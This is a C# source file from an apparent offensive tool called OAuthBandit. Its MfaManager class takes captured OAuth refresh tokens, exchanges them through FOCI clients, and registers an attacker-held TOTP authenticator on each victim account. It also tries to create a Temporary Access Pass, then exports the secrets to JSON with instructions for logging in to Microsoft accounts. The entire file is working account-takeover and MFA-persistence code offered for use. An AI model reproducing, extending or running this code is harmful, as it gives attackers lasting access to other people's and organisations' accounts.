using System.Text.Json;
using OAuthBandit.Core;

namespace OAuthBandit.Mfa;

public class MfaManager
{
    private readonly string _outputDir;
    public List<Dictionary<string, object?>> Results { get; } = new();

    public MfaManager(string outputDir = ".")
    {
        _outputDir = outputDir;
    }

    public Dictionary<string, object?> ProcessRefreshToken(string refreshToken, string upn = "unknown",
        string tenantId = "common")
    {
        var result = new Dictionary<string, object?>
        {
            ["account"] = upn,
            ["tenant_id"] = tenantId,
            ["timestamp"] = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") + " UTC",
            ["steps"] = new Dictionary<string, object?>
            {
                ["token_exchange"] = new Dictionary<string, object?> { ["status"] = "pending", ["details"] = new Dictionary<string, object?>() },
                ["totp_registration"] = new Dictionary<string, object?> { ["status"] = "pending", ["details"] = new Dictionary<string, object?>() },
                ["tap_creation"] = new Dictionary<string, object?> { ["status"] = "pending", ["details"] = new Dictionary<string, object?>() }
            },
            ["mfa_credentials"] = new Dictionary<string, object?>(),
            ["errors"] = new List<string>()
        };

        var steps = (Dictionary<string, object?>)result["steps"]!;
        var creds = (Dictionary<string, object?>)result["mfa_credentials"]!;
        var errors = (List<string>)result["errors"]!;

        Console.WriteLine($"\n{"".PadRight(60, '=')}");
        Console.WriteLine($"[*] MFA PERSISTENCE - {upn}");
        Console.WriteLine($"{"".PadRight(60, '=')}");

        // Step 1: Exchange refresh token
        Console.WriteLine($"\n[1/3] Exchanging refresh token...");
        var exchanger = new TokenExchangeService(tenantId);
        var exchangeResult = exchanger.TryFociExchange(refreshToken);

        TokenResponse? tokenResp = null;
        if (exchangeResult.HasValue)
        {
            var (clientName, resp) = exchangeResult.Value;
            tokenResp = resp;
            steps["token_exchange"] = new Dictionary<string, object?>
            {
                ["status"] = "success",
                ["details"] = new Dictionary<string, object?>
                {
                    ["foci_client_used"] = clientName,
                    ["scope_obtained"] = resp.Scope,
                    ["admin_privileges"] = resp.HasAdminScope
                }
            };
            if (resp.RefreshToken != null)
                creds["new_refresh_token"] = resp.RefreshToken;
        }
        else
        {
            steps["token_exchange"] = new Dictionary<string, object?> { ["status"] = "failed" };
            errors.Add("Token exchange failed with all FOCI clients");
            Console.WriteLine("    [!] All token exchanges failed");
            Results.Add(result);
            return result;
        }

        // Step 2: Register TOTP
        Console.WriteLine($"\n[2/3] Registering TOTP authenticator...");
        var totpReg = new TotpRegister(tokenResp.AccessToken);
        var totpSecret = totpReg.RegisterTotp();

        if (totpSecret != null)
        {
            steps["totp_registration"] = new Dictionary<string, object?> { ["status"] = "success" };
            creds["totp"] = new Dictionary<string, object?>
            {
                ["secret_key"] = totpSecret.SecretKey,
                ["otp_uri"] = totpSecret.OtpUri,
                ["issuer"] = "Microsoft",
                ["algorithm"] = "SHA1",
                ["digits"] = 6,
                ["period"] = 30,
                ["usage"] = "Import this OTP URI in any authenticator app (Google Authenticator, Authy, etc.)"
            };
            Console.WriteLine($"    [+] TOTP Secret: {totpSecret.SecretKey}");
            Console.WriteLine($"    [+] OTP URI: {totpSecret.OtpUri}");
            Console.WriteLine($"    [+] Current code: {totpSecret.GenerateCode()}");
        }
        else
        {
            steps["totp_registration"] = new Dictionary<string, object?> { ["status"] = "failed" };
            errors.Add("TOTP registration failed");
        }

        // Step 3: Try TAP
        Console.WriteLine($"\n[3/3] Attempting TAP creation...");
        var tapCreator = new TapCreate(tokenResp.AccessToken);

        TAPResult? tapResult = null;
        if (tokenResp.HasAdminScope)
        {
            if (tapCreator.CheckTapPolicy())
                tapResult = tapCreator.CreateTapForSelf(480);
            if (tapResult == null)
            {
                steps["tap_creation"] = new Dictionary<string, object?> { ["status"] = "failed" };
                errors.Add("TAP policy disabled or no access");
            }
        }
        else
        {
            Console.WriteLine("    [*] No admin scope detected, trying anyway...");
            tapResult = tapCreator.CreateTapForSelf(60);
            if (tapResult == null)
            {
                steps["tap_creation"] = new Dictionary<string, object?> { ["status"] = "failed" };
                errors.Add("TAP creation failed (no admin privileges)");
            }
        }

        if (tapResult != null)
        {
            steps["tap_creation"] = new Dictionary<string, object?> { ["status"] = "success" };
            creds["tap"] = new Dictionary<string, object?>
            {
                ["code"] = tapResult.TapCode,
                ["expires_at"] = tapResult.ExpiresAt,
                ["is_single_use"] = tapResult.IsUsableOnce,
                ["usage"] = "Use this code as password at login.microsoftonline.com"
            };
        }

        PrintResultSummary(result);
        Results.Add(result);
        return result;
    }

    public void ProcessAllTokens(List<Token> tokens)
    {
        var refreshTokens = tokens.Where(t => t.TokenType == "refresh_token").ToList();
        if (refreshTokens.Count == 0)
        {
            Console.WriteLine("\n[!] No refresh tokens found - MFA persistence requires refresh tokens");
            return;
        }

        Console.WriteLine($"\n[*] Found {refreshTokens.Count} refresh token(s)");

        var seen = new HashSet<string>();
        var unique = new List<Token>();
        foreach (var t in refreshTokens)
        {
            var key = t.Upn ?? t.TokenValue[..Math.Min(100, t.TokenValue.Length)];
            if (seen.Add(key)) unique.Add(t);
        }

        foreach (var t in unique)
            ProcessRefreshToken(t.TokenValue, t.Upn ?? "unknown", t.TenantId ?? "common");

        if (Results.Count > 0) ExportResults();
    }

    public void ExportResults()
    {
        var exportDir = Path.Combine(_outputDir, "export");
        Directory.CreateDirectory(exportDir);

        var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        var filename = Path.Combine(exportDir, $"mfa_persistence_{timestamp}.json");

        int totpCount = Results.Count(r => r.TryGetValue("mfa_credentials", out var c) &&
            c is Dictionary<string, object?> d && d.ContainsKey("totp"));
        int tapCount = Results.Count(r => r.TryGetValue("mfa_credentials", out var c) &&
            c is Dictionary<string, object?> d && d.ContainsKey("tap"));

        var output = new Dictionary<string, object?>
        {
            ["_description"] = "OAuthBandit MFA Persistence - Credentials from refresh tokens",
            ["metadata"] = new Dictionary<string, object?>
            {
                ["generated_at"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                ["tool"] = "OAuthBandit",
                ["module"] = "MFA Persistence",
                ["version"] = "2.0"
            },
            ["summary"] = new Dictionary<string, object?>
            {
                ["accounts_processed"] = Results.Count,
                ["totp_registered"] = totpCount,
                ["tap_created"] = tapCount,
                ["success_rate"] = $"{totpCount}/{Results.Count}"
            },
            ["how_to_use"] = new Dictionary<string, string>
            {
                ["totp"] = "Import the OTP URI into Google Authenticator / Authy / any TOTP app",
                ["tap"] = "Use the TAP code as password at https://login.microsoftonline.com"
            },
            ["accounts"] = Results
        };

        File.WriteAllText(filename, JsonSerializer.Serialize(output, new JsonSerializerOptions { WriteIndented = true }));
        Console.WriteLine($"\n[+] MFA results exported to: {filename}");
    }

    private static void PrintResultSummary(Dictionary<string, object?> result)
    {
        var steps = (Dictionary<string, object?>)result["steps"]!;
        var creds = (Dictionary<string, object?>)result["mfa_credentials"]!;
        var errors = (List<string>)result["errors"]!;

        string GetStatus(string key) =>
            steps.TryGetValue(key, out var s) && s is Dictionary<string, object?> d && d.TryGetValue("status", out var st)
                ? st?.ToString() ?? "?" : "?";

        Console.WriteLine($"\n{"".PadRight(60, '-')}");
        Console.WriteLine($"[*] RESULT: {result["account"]}");
        Console.WriteLine($"    Token Exchange:    {GetStatus("token_exchange")}");
        Console.WriteLine($"    TOTP Registration: {GetStatus("totp_registration")}");
        Console.WriteLine($"    TAP Creation:      {GetStatus("tap_creation")}");

        if (creds.TryGetValue("totp", out var totp) && totp is Dictionary<string, object?> td)
            Console.WriteLine($"    --> TOTP Secret: {td["secret_key"]}");
        if (creds.TryGetValue("tap", out var tap) && tap is Dictionary<string, object?> tapd)
            Console.WriteLine($"    --> TAP Code: {tapd["code"]}");

        if (errors.Count > 0)
            Console.WriteLine($"    Errors: {string.Join(", ", errors)}");
    }
}
